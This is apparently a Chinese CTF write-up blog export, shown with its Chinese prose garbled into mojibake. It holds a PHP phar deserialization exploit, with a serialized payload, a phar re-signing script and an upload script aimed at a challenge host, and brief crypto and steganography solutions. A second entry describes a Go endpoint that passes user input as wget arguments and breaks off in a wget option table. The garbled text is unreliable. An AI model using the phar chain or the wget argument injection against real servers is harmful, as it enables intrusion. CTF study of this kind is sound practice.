Error(&quot;start&quot;);?&gt;</code></pre><p>é¢˜ç›®å¾ˆæ˜æ˜¾æ˜¯è¦å…ˆpostå‚æ•°1å»è°ƒç”¨Dç±»é‡Œçš„file_put_contentï¼Œç„¶åå†™å…¥æˆ‘ä»¬çš„pharæ–‡ä»¶ï¼Œå†é€šè¿‡file_get_contentå»è®¿é—®pharæ–‡ä»¶æ¥å®ç°ååºåˆ—åŒ–ï¼Œä»airç±»é‡Œçš„<code>echo new $p($value);</code>ä¹Ÿèƒ½çœ‹å‡ºè¿™é‡Œè¦ç”¨åŸç”Ÿç±»æ¥è¯»ç›®å½•å’Œæ–‡ä»¶ã€‚</p><p>é“¾å­å¾ˆç®€å•ï¼Œå°±ä¸è¯´äº†ã€‚è¿™é‡Œä¸»è¦çš„éš¾åº¦æ˜¯ç»•è¿‡æœ€åçš„<code>throw new Error(&quot;start&quot;);</code>è¯­å¥ï¼Œå¦‚æœæƒ³åˆ©ç”¨destructæ–¹æ³•ååºåˆ—åŒ–ä¼šå› ä¸ºæœ€åçš„æŠ›å‡ºé”™è¯¯çš„è¯­å¥å¯¼è‡´ç¨‹åºæå‰ç»“æŸï¼Œæ‰€ä»¥è¿™é‡Œè¦åˆ©ç”¨unsetæ¥ç»•è¿‡æœ€åçš„é”™è¯¯ï¼Œè®©ååºåˆ—åŒ–æˆåŠŸè¿›è¡Œ</p><p>å…·ä½“çš„æ­¥éª¤çœ‹è¿™ä¸ª</p><p>[<a href="https://blog.csdn.net/cosmoslin/article/details/120797688">pharååºåˆ—åŒ–][NSSCTF]prize_p1_Snakin_yaçš„åšå®¢-CSDNåšå®¢</a></p><p>æ‰€ä»¥å†™æ–‡ä»¶æ—¶ï¼š</p><p>å‚æ•°1ï¼š</p><pre class="language-none"><code class="language-none">O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;</code></pre><p>å‚æ•°0ï¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131509238.png" alt="image-20220522131509238"></p><p>ç”Ÿæˆpharæ–‡ä»¶ä¹‹ååœ¨010é‡Œè¿›è¡Œä¿®æ”¹ï¼ˆè¿™æ˜¯è¯»æ–‡ä»¶çš„pharï¼Œè¯»ç›®å½•çš„æ—¶å€™å¿˜äº†æˆªå›¾è¢«è¦†ç›–äº†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522133028155.png" alt="image-20220522133028155"></p><p>ç„¶åä¿®æ”¹ç­¾å</p><pre class="language-python" data-language="python"><code class="language-python">from hashlib import sha1file &#x3D; open(&#39;..&#x2F;php&#x2F;NSSCTF prize_p1&#x2F;ars.phar&#39;, &#39;rb&#39;).read()text &#x3D; file[:-28]  #è¯»å–å¼€å§‹åˆ°æœ«å°¾é™¤ç­¾åå¤–å†…å®¹last &#x3D; file[-8:]   #è¯»å–æœ€å8ä½çš„GBMBå’Œç­¾åflagnew_file &#x3D; text+sha1(text).digest() + last  #ç”Ÿæˆæ–°çš„æ–‡ä»¶å†…å®¹ï¼Œä¸»è¦æ˜¯æ­¤æ—¶sha1æ­£ç¡®äº†ã€‚open(&#39;reaflag2.phar&#39;, &#39;wb&#39;).write(new_file)</code></pre><p>è¾¾åˆ°è°ƒç”¨unsetçš„ç›®çš„</p><p>ç„¶åè¦ç»•è¿‡ä»£ç ä¸­çš„wafï¼Œå¯ä»¥å¯¹pharæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼ŒåŸç†å¯ä»¥çœ‹è¿™ä¸ª<a href="https://www.anquanke.com/post/id/240007#h2-5">https://www.anquanke.com/post/id/240007#h2-5</a></p><p>å†åˆ©ç”¨pythonè„šæœ¬ä¸Šä¼ æ–‡ä»¶</p><pre class="language-none"><code class="language-none">import requesturl &#x3D; &#39;http:&#x2F;&#x2F;8bfdc886-3097-4a19-978d-9a417e256662.node4.buuoj.cn:81&#x2F;&#39;res &#x3D; requests.post(    url,    data&#x3D;&#123;        1: &#39;O:1:&quot;D&quot;:2:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;;s:4:&quot;star&quot;;O:1:&quot;D&quot;:1:N&#125;&#39;,        0: open(&#39;.&#x2F;reaflag2.phar.gz&#39;, &#39;rb&#39;).read()    &#125;) # å†™å…¥print(res.text)</code></pre><p>å¾—åˆ°ä¸Šä¼ åœ°å€ä¹‹ååˆ©ç”¨pharåè®®è®¿é—®ä¸€ä¸‹å°±è¡Œã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522131430525.png" alt="image-20220522131430525"></p><p>æ”¹pharå†…å®¹çš„æ—¶å€™ä¸èƒ½ç”¨txtï¼Œä¸Šä¼ ä¹Ÿä¸èƒ½ç”¨burpï¼Œè¿™ä¸¤ä¸ªå¡äº†æˆ‘å¥½ä¹…ã€‚ã€‚ã€‚</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Welcome-to-fxxking-DestCTF"><a href="#Welcome-to-fxxking-DestCTF" class="headerlink" title="Welcome to fxxking DestCTF"></a>Welcome to fxxking DestCTF</h2><p>çº¯ç­¾åˆ°</p><h2 id="Pngenius"><a href="#Pngenius" class="headerlink" title="Pngenius"></a>Pngenius</h2><p>å›¾ç‰‡é‡Œæœ‰ä¸ªå‹ç¼©åŒ…ï¼Œåˆ†ç¦»å‡ºæ¥ä¹‹åå‘ç°éœ€è¦å¯†ç ï¼ŒçŒœæµ‹å¯†ç ä¹Ÿåœ¨å›¾ç‰‡é‡Œï¼Œzstegè·‘ä¸€é</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520142310366.png" alt="image-20220520142310366"></p><p>æ‹¿åˆ°å¯†ç ,æ‰“å¼€å‹ç¼©åŒ…æ‰¾åˆ°flag</p><h2 id="EasyEncode"><a href="#EasyEncode" class="headerlink" title="EasyEncode"></a>EasyEncode</h2><p>çˆ†ç ´è·‘å¯†ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520155335442.png" alt="image-20220520155335442"></p><p>é‡Œé¢æ˜¯æ‘©æ–¯å¯†ç ï¼Œè§£ç ä¹‹åæ˜¯ä¸€å¤§ä¸²æ•°å­—</p><pre class="language-txt" data-language="txt"><code class="language-txt">5 C 7 5 3 0 3 0 3 5 3 2 5 C 7 5 3 0 3 0 3 4 3 7 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 6 3 4 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 4 3 2 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 4 6 4 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 7 3 4 5 C 7 5 3 0 3 0 3 4 3 5 5 C 7 5 3 0 3 0 3 5 6 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 6 6 2 5 C 7 5 3 0 3 0 3 6 3 1 5 C 7 5 3 0 3 0 3 5 3 7 5 C 7 5 3 0 3 0 3 3 3 5 5 C 7 5 3 0 3 0 3 6 6 5 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 7 6 1 5 C 7 5 3 0 3 0 3 5 3 8 5 C 7 5 3 0 3 0 3 3 3 2 5 C 7 5 3 0 3 0 3 5 3 5 5 C 7 5 3 0 3 0 3 3 3 0 5 C 7 5 3 0 3 0 3 6 3 3 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 6 6 3 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 4 6 5 5 C 7 5 3 0 3 0 3 4 3 6 5 C 7 5 3 0 3 0 3 3 3 9 5 C 7 5 3 0 3 0 3 5 3 6 5 C 7 5 3 0 3 0 3 6 3 6 5 C 7 5 3 0 3 0 3 5 3 1 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 5 C 7 5 3 0 3 0 3 2 3 5 5 C 7 5 3 0 3 0 3 3 3 3 5 C 7 5 3 0 3 0 3 4 3 4 </code></pre><p>å¤åˆ¶åˆ°010é‡Œå‘ç°æ˜¯Unicodeç¼–ç </p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162301828.png" alt="image-20220520162301828"></p><p>Unicodeè§£ç å‘ç°æ˜¯base64ï¼Œå†è§£ç å¾—åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520162337045.png" alt="image-20220520162337045"></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>å·²çŸ¥nceï¼Œè¦æ±‚å‡ºæ˜æ–‡ï¼Œå°±è¦å…ˆæƒ³åŠæ³•æ±‚å‡ºqpdï¼Œ</p><p>åˆ©ç”¨RsaCtfTool.pyè¿›è¡Œæ±‚è§£</p><p>æ±‚å…¬é’¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151555940.png" alt="image-20220520151555940"></p><p>ç„¶åå†æ±‚ç§é’¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151624537.png" alt="image-20220520151624537"></p><p>æœ€åå¾—åˆ°qpd</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151647055.png" alt="image-20220520151647055"></p><p>éšä¾¿æ‰¾ä¸ªrsaè„šæœ¬å¥—è¿›å»å°±è¡Œäº†</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import long_to_bytesstring &#x3D; &#39;&#39;for x in range(1):   c &#x3D; 14181751948841206148995320731138166924841307246014981115736748934451763670304308496261846056687977917728671991049712129745906089287169170294259856601300717330153987080212591008738712344004443623518040786009771108879196701679833782022875324499201475522241396314392429412747392203809125245393462952461525539673218721341853515099201642769577031724762640317081252046606564108211626446676911167979492329012381654087618979631924439276786566078856385835786995011067720124277812004808431347148593882791476391944410064371926611180496847010107167486521927340045188960373155894717498700488982910217850877130989318706580155251854   q &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973969401   p &#x3D; 165143607013706756535226162768509114446233024193609895145003307138652758365886458917899911435630452642271040480670481691733000313754732183700991227511971005378010205097929462099354944574007393761811271098947894183507596772524174007304430976545608980195888302421142266401500880413925699125132100053801973971467   n &#x3D; 27272410937497615429184017335437367466288981498585803398561456300019447702001403165885200936510173980380489828828523983388730026101865884520679872671569532101708469344562155718974222196684544003071765625134489632331414011555536130289106822732544904502428727133498239161324625698270381715640332111381465813621908465311076678337695819124178638737015840941223342176563458181918865641701282965455705790456658431641632470787689389714643528968037519265144919465402561959014798324908010947632834281698638848683632113623788303921939908168450492197671761167009855312820364427648296494571794298105543758141065915257674305081267   e &#x3D; 65537   #d &#x3D; libnum.invmod(e, (p - 1) * (q - 1))   d &#x3D; 3121448257353397521008122343609193178885723335228834266026969249529973560167730063129299361044338541996643944734161746790345361029496254021234107830835147478445995827602129027084328557873121512535534338680955898684986137612006599528489101993024083016810624261537303995439156771941439694356136703960699682133382027158795284121176051335224541792139301998430867357667228591618159856224671481257868298256833038515716847186893503607277761265884934308680131384025054980116408946675249894376907198506526558779944638834026881901482983419902337359310844362781386068641635065060468067278449010820146945870895885764387716082673   m &#x3D; pow(c, d, n)   string +&#x3D; str(long_to_bytes(m),&#39;utf-8&#39;)print(string)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520151729727.png" alt="image-20220520151729727"></p><h2 id="babyAES"><a href="#babyAES" class="headerlink" title="babyAES"></a>babyAES</h2><p>è¿™ä¸ªæ€ä¹ˆè¯´å‘¢ã€‚ã€‚ã€‚ç¡®å®å¾ˆç®€å•</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220520153806437.png" alt="image-20220520153806437"></p><p>åªè¦æŠŠç»™çš„å€¼å¸¦è¿›å»ç„¶åæŠŠåŠ å¯†æ”¹æˆè§£å¯†å°±è¡Œäº†</p><h2 id="ezDLP"><a href="#ezDLP" class="headerlink" title="ezDLP"></a>ezDLP</h2><p>ç¦»æ•£å¯¹æ•°é—®é¢˜</p><p>ç›´æ¥ç”¨sageæ±‚å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521223939336.png" alt="image-20220521223939336"></p><p>ç„¶åå°†ç»“æœè½¬æˆåå…­è¿›åˆ¶å†è½¬æ¢æˆå­—ç¬¦</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220521224029558.png" alt="image-20220521224029558"></p><h2 id="ezStream"><a href="#ezStream" class="headerlink" title="ezStream"></a>ezStream</h2><p>0xGame2021æœ‰ä¸ªå·®ä¸å¤šçš„ï¼Œç›´æ¥æŠ„ä¸€ä¸‹ç°æˆçš„è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">from Crypto.Util.number import *base &#x3D; pow(2,32)i &#x3D; 104984523a &#x3D; 3939333498b &#x3D; 3662432446m &#x3D; 2271373817state1 &#x3D; 17362state2 &#x3D; 20624# while i &lt;&#x3D; base:#     # print(i)#     if ((a*i+b)%m)&gt;&gt;16 &#x3D;&#x3D; state1 and ((((a*i+b)%m)*a+b)%m)&gt;&gt;16 &#x3D;&#x3D; state2:#         print(&#39;find it&#39;,i)#         break#     i+&#x3D;1seed &#x3D; 104984523#class LCG:    def __init__(self):        self.a &#x3D; a        self.b &#x3D; b        self.m &#x3D; m        self.seed &#x3D; 104984523    def next(self):        self.seed &#x3D; (self.a * self.seed + self.b) % self.m        return self.seed &gt;&gt; 16    def output(self):        print(&quot;a &#x3D; &#123;&#125;\nb &#x3D; &#123;&#125;\nm &#x3D; &#123;&#125;&quot;.format(self.a, self.b, self.m))        print(&quot;state1 &#x3D; &#123;&#125;&quot;.format(self.next()))        print(&quot;state2 &#x3D; &#123;&#125;&quot;.format(self.next()))lcg &#x3D; LCG()lcg.output()flag &#x3D; long_to_bytes(&#39;600017039001091357643174067454938198067935635401496485588306838343558125283178792619821966678282131419050878&#39;).decode()c &#x3D; b&#39;&#39;.join([long_to_bytes(ord(flag[i]) ^ (lcg.next() % 10))              for i in range(len(flag))])print(c)</code></pre><p>åˆ©ç”¨æ³¨é‡Šçš„é‚£æ®µçˆ†å‡ºseedçš„å€¼ï¼Œç„¶åå¸¦è¿›å»å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/Dest0g3%20520/image-20220522150127328.png" alt="image-20220522150127328"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é™‡åŸæˆ˜å½¹å¤ç°</title>
      <link href="/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/05/12/%E9%99%87%E5%8E%9F%E6%88%98%E5%BD%B9%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å¥½ä¹…ä¹‹å‰å°±æƒ³å¤ç°è¿™ä¸ªäº†ï¼Œä¸€ç›´æ‹–åˆ°äº†ç°åœ¨</p><h2 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h2><p>ä¸‹è½½é™„ä»¶åé‡Œé¢æ˜¯ä¸ªgoæ–‡ä»¶</p><p>ä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªé¢˜è·Ÿgoå…³ç³»ä¸å¤§</p><pre class="language-go" data-language="go"><code class="language-go">func getController(c *gin.Context) &#123;    cmd :&#x3D; exec.Command(&quot;&#x2F;bin&#x2F;wget&quot;, c.QueryArray(&quot;argv&quot;)[1:]...)&#x2F;&#x2F;è¿™é‡Œçš„QueryArrayæ˜¯ginæ¡†æ¶ä¸­æ¥æ”¶ä¸€ç»„è¯·æ±‚çš„æ–¹æ³•ã€‚å› æ­¤åœ¨ä¼ å‚çš„è¿‡ç¨‹ä¸­ï¼Œæ•°ç»„å†…å…ƒç´ ä¸ªæ•°æ²¡æœ‰é™åˆ¶ï¼Œåªéœ€è¦çŸ¥é“æ•°ç»„å†…çš„å…ƒç´ ä¼šæ‹¼æ¥åˆ°ä¸€èµ·è·Ÿåœ¨wgetåé¢æ‰§è¡Œå³å¯ã€‚    err :&#x3D; cmd.Run()    if err !&#x3D; nil &#123;        fmt.Println(&quot;error: &quot;, err)    &#125;        c.String(http.StatusOK, &quot;Nothing&quot;)&#125;    router.GET(&quot;&#x2F;wget&quot;, getController)</code></pre><p>å¯ä»¥çœ‹åˆ°/wgetè·¯ç”±ä¸‹æœ‰ä¸ªgetController</p><p>æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹wget</p><p>wgetå‘½ä»¤æ˜¯Linuxç³»ç»Ÿç”¨äºä»Webä¸‹è½½æ–‡ä»¶çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæ”¯æŒ HTTPã€HTTPSåŠFTPåè®®ä¸‹è½½æ–‡ä»¶ï¼Œè€Œä¸”wgetè¿˜æä¾›äº†å¾ˆå¤šé€‰é¡¹ï¼Œä¾‹å¦‚ä¸‹è½½å¤šä¸ªæ–‡ä»¶ã€åå°ä¸‹è½½ï¼Œä½¿ç”¨ä»£ç†ç­‰ç­‰</p><blockquote><p><a href="https://blog.dn.net/skdkjzz/article/details/39103947">åµŒå…¥å¼ Wgetä½¿ç”¨ä¸€ç‚¹æ–¹æ³•_skdkjzzçš„åšå®¢-CSDNåšå®¢</a></p><p><strong>postè¯·æ±‚</strong></p><p>Wgeté»˜è®¤å‘é€Getè¯·æ±‚ï¼Œé€šè¿‡æŒ‡å®šå‚æ•°--post-dataor --post-file è¿™ä¸¤ä¸ªé€‰é¡¹</p><p>e.g wget--post-data &quot;aaaa&quot; <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>â€‹     wget--post-data &quot;user=foo&quot; <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>â€‹     wgetâ€“post-file post_file <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p><strong>headè¯·æ±‚</strong></p><p>wget --debug--spider <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>â€‹     --spiderå¹¶ä¸ä¸‹è½½æ–‡ä»¶ï¼Œé€šè¿‡headè¯·æ±‚æœåŠ¡å™¨ï¼Œè·å–webæœåŠ¡å™¨å“åº”</p><p><strong>â€“no-cacheç¦ç”¨ç¼“å­˜</strong></p><p>e.g  wgetâ€“no-cache <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p>â€‹     è¯·æ±‚æ•°æ®åŒ…å¤´éƒ¨Pragma :no-cacheï¼Œä¸ä½¿ç”¨ç¼“å­˜ï¼Œhttp1.1åŠ ä¸ŠCache-Control: no-cache, must-revalidate</p><p><strong>â€“refererä½¿ç”¨referer</strong></p><p>Referrerä¸»è¦ç”¨æˆ·ç‚¹å‡»çš„ä¸Šä¸€ä¸ªé¡µé¢ï¼Œä¸€èˆ¬å¯ä»¥ç”¨åšé˜²ç›—é“¾æŠ€æœ¯ï¼Œé˜²ç›—é“¾å¯ä»¥åœ¨urlåé¢åŠ ä¸€ä¸ªkey=valueåŠ å¯†å­—æ®µï¼Œæˆ–è€…ä½¿ç”¨ç‰¹å®šrefererå­—æ®µã€‚</p><p>e.g  wgetâ€“debug â€“referer <a href="http://www.baidu.com/">www.baidu.com</a> <a href="http://127.0.0.1:8333/test.php">http://127.0.0.1:8333/test.php</a></p><p><strong>æ˜¾ç¤ºwgetå¸®åŠ©å’Œç‰ˆæœ¬ä¿¡æ¯</strong></p><p>Wget â€“v or wget â€“h</p><p><strong>â€“e å°±æ˜¯æ‰§è¡Œå‘½ä»¤</strong></p><p>e.g wget-e &quot;postdata=111111111&quot; <a href="http://localhost:8333/test.php">http://localhost:8333/test.php</a></p><p>è¿™ç§å½¢å¼å’Œwget â€“post-data=â€11111111â€ <a href="http://localhost:8333/test.php%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84%E3%80%82">http://localhost:8333/test.phpæ˜¯ç›¸åŒçš„ã€‚</a></p><p><strong>logfile (-o)æŠŠdebugä¿¡æ¯è¾“å‡ºåˆ°æ–‡ä»¶</strong></p><p>wget <a href="http://localhost:8333/test.php">http://localhost:8333/test.php</a> -ologfile</p><p><strong>refererè®¾ç½®</strong></p><p>wget --debug --referer &quot;<a href="http://www.baidu.com/dsadsa&quot;">www.baidu.com/dsadsa&quot;</a> <a href="http://www.baidu.com/index.html">www.baidu.com/index.html</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/cfbd9ca006b1">wget - ç®€ä¹¦ (jianshu.com)</a></p><p>ç”¨æ³•ï¼š wget [é€‰é¡¹]... [URL]...</p><p>é•¿é€‰é¡¹æ‰€å¿…é¡»çš„å‚æ•°åœ¨ä½¿ç”¨çŸ­é€‰é¡¹æ—¶ä¹Ÿæ˜¯å¿…é¡»çš„ã€‚</p><p><strong>å¯åŠ¨ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-V, --version</td><td>æ˜¾ç¤º Wget çš„ç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡ºã€‚</td></tr><tr><td>-h, --help</td><td>æ‰“å°æ­¤å¸®åŠ©ã€‚</td></tr><tr><td>-b, --background</td><td>å¯åŠ¨åè½¬å…¥åå°ã€‚</td></tr><tr><td>-e, --execute=COMMAND</td><td>è¿è¡Œä¸€ä¸ªâ€œ.wgetrcâ€é£æ ¼çš„å‘½ä»¤ã€‚</td></tr></tbody></table><p><strong>æ—¥å¿—å’Œè¾“å…¥æ–‡ä»¶ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-o, --output-file=FILE</td><td>å°†æ—¥å¿—ä¿¡æ¯å†™å…¥ FILEã€‚</td></tr><tr><td>-a, --append-output=FILE</td><td>å°†ä¿¡æ¯æ·»åŠ è‡³ FILEã€‚</td></tr><tr><td>-d, --debug</td><td>æ‰“å°å¤§é‡è°ƒè¯•ä¿¡æ¯ã€‚</td></tr><tr><td>-q, --quiet</td><td>å®‰é™æ¨¡å¼ (æ— ä¿¡æ¯è¾“å‡º)ã€‚</td></tr><tr><td>-v, --verbose</td><td>è¯¦å°½çš„è¾“å‡º (æ­¤ä¸ºé»˜è®¤å€¼)ã€‚</td></tr><tr><td>-nv, --no-verbose</td><td>å…³é—­è¯¦å°½è¾“å‡ºï¼Œä½†ä¸è¿›å…¥å®‰é™æ¨¡å¼ã€‚</td></tr><tr><td>--report-speed=TYPE</td><td>Output bandwidth as TYPE. TYPE can be bits.</td></tr><tr><td>-i, --input-file=FILE</td><td>ä¸‹è½½æœ¬åœ°æˆ–å¤–éƒ¨ FILE ä¸­çš„ URLsã€‚</td></tr><tr><td>-F, --force-html</td><td>æŠŠè¾“å…¥æ–‡ä»¶å½“æˆ HTML æ–‡ä»¶ã€‚</td></tr><tr><td>-B, --base=URL</td><td>è§£æä¸ URL ç›¸å…³çš„HTML è¾“å…¥æ–‡ä»¶ (ç”± -i -F é€‰é¡¹æŒ‡å®š)ã€‚</td></tr><tr><td>--config=FILE</td><td>Specify config file to use.</td></tr></tbody></table><p><strong>ä¸‹è½½ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-t, --tries=NUMBER</td><td>è®¾ç½®é‡è¯•æ¬¡æ•°ä¸º NUMBER (0 ä»£è¡¨æ— é™åˆ¶)ã€‚</td></tr><tr><td>--retry-connrefused</td><td>å³ä½¿æ‹’ç»è¿æ¥ä¹Ÿæ˜¯é‡è¯•ã€‚</td></tr><tr><td>-O, --output-document=FILE</td><td>å°†æ–‡æ¡£å†™å…¥ FILEã€‚</td></tr><tr><td>-nc, --no-clobber</td><td>skip downloads that would download to existing files (overwriting them).</td></tr><tr><td>-c, --continue</td><td>æ–­ç‚¹ç»­ä¼ ä¸‹è½½æ–‡ä»¶ã€‚</td></tr><tr><td>--progress=TYPE</td><td>é€‰æ‹©è¿›åº¦æ¡ç±»å‹ã€‚</td></tr><tr><td>-N, --timestamping</td><td>åªè·å–æ¯”æœ¬åœ°æ–‡ä»¶æ–°çš„æ–‡ä»¶ã€‚</td></tr><tr><td>--no-use-server-timestamps</td><td>ä¸ç”¨æœåŠ¡å™¨ä¸Šçš„æ—¶é—´æˆ³æ¥è®¾ç½®æœ¬åœ°æ–‡ä»¶ã€‚</td></tr><tr><td>-S, --server-response</td><td>æ‰“å°æœåŠ¡å™¨å“åº”ã€‚</td></tr><tr><td>--spider</td><td>ä¸ä¸‹è½½ä»»ä½•æ–‡ä»¶ã€‚</td></tr><tr><td>-T, --timeout=SECONDS</td><td>å°†æ‰€æœ‰è¶…æ—¶è®¾ä¸º SECONDS ç§’ã€‚</td></tr><tr><td>--dns-timeout=SECS</td><td>è®¾ç½® DNS æŸ¥å¯»è¶…æ—¶ä¸º SECS ç§’ã€‚</td></tr><tr><td>--connect-timeout=SECS</td><td>è®¾ç½®è¿æ¥è¶…æ—¶ä¸º SECS ç§’ã€‚</td></tr><tr><td>--read-timeout=SECS</td><td>è®¾ç½®è¯»å–è¶…æ—¶ä¸º SECS ç§’ã€‚</td></tr><tr><td>-w, --wait=SECONDS</td><td>ç­‰å¾…é—´éš”ä¸º SECONDS ç§’ã€‚</td></tr><tr><td>--waitretry=SECONDS</td><td>åœ¨è·å–æ–‡ä»¶çš„é‡è¯•æœŸé—´ç­‰å¾… 1..SECONDS ç§’ã€‚</td></tr><tr><td>--random-wait</td><td>è·å–å¤šä¸ªæ–‡ä»¶æ—¶ï¼Œæ¯æ¬¡éšæœºç­‰å¾…é—´éš”0.5<em>WAIT...1.5</em>WAIT ç§’ã€‚</td></tr><tr><td>--no-proxy</td><td>ç¦æ­¢ä½¿ç”¨ä»£ç†ã€‚</td></tr><tr><td>-Q, --quota=NUMBER</td><td>è®¾ç½®è·å–é…é¢ä¸º NUMBER å­—èŠ‚ã€‚</td></tr><tr><td>--bind-address=ADDRESS</td><td>ç»‘å®šè‡³æœ¬åœ°ä¸»æœºä¸Šçš„ ADDRESS (ä¸»æœºåæˆ–æ˜¯ IP)ã€‚</td></tr><tr><td>--limit-rate=RATE</td><td>é™åˆ¶ä¸‹è½½é€Ÿç‡ä¸º RATEã€‚</td></tr><tr><td>--no-dns-cache</td><td>å…³é—­ DNS æŸ¥å¯»ç¼“å­˜ã€‚</td></tr><tr><td>--restrict-file-names=OS</td><td>é™å®šæ–‡ä»¶åä¸­çš„å­—ç¬¦ä¸º OS å…è®¸çš„å­—ç¬¦ã€‚</td></tr><tr><td>--ignore-case</td><td>åŒ¹é…æ–‡ä»¶/ç›®å½•æ—¶å¿½ç•¥å¤§å°å†™ã€‚</td></tr><tr><td>-4, --inet4-only</td><td>ä»…è¿æ¥è‡³ IPv4 åœ°å€ã€‚</td></tr><tr><td>-6, --inet6-only</td><td>ä»…è¿æ¥è‡³ IPv6 åœ°å€ã€‚</td></tr><tr><td>--prefer-family=FAMILY</td><td>é¦–å…ˆè¿æ¥è‡³æŒ‡å®šåè®®çš„åœ°å€FAMILY ä¸º IPv6ï¼ŒIPv4 æˆ–æ˜¯ noneã€‚</td></tr><tr><td>--user=USER</td><td>å°† ftp å’Œ http çš„ç”¨æˆ·åå‡è®¾ç½®ä¸º USERã€‚</td></tr><tr><td>--password=PASS</td><td>å°† ftp å’Œ http çš„å¯†ç å‡è®¾ç½®ä¸º PASSã€‚</td></tr><tr><td>--ask-password</td><td>æç¤ºè¾“å…¥å¯†ç ã€‚</td></tr><tr><td>--no-iri</td><td>å…³é—­ IRI æ”¯æŒã€‚</td></tr><tr><td>--local-encoding=ENC</td><td>IRI (å›½é™…åŒ–èµ„æºæ ‡è¯†ç¬¦) ä½¿ç”¨ ENC ä½œä¸ºæœ¬åœ°ç¼–ç ã€‚</td></tr><tr><td>--remote-encoding=ENC</td><td>ä½¿ç”¨ ENC ä½œä¸ºé»˜è®¤è¿œç¨‹ç¼–ç ã€‚</td></tr><tr><td>--unlink</td><td>remove file before clobber.</td></tr></tbody></table><p><strong>ç›®å½•ï¼š</strong></p><table><thead><tr><th>å‚æ•°</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>-nd, --no-directories</td><td>ä¸åˆ›å»ºç›®å½•ã€‚</td></tr><tr><td>-x, --force-directories</td><td>å¼ºåˆ¶åˆ›å»ºç›®å½•ã€‚</td></tr><tr><td>-nH, 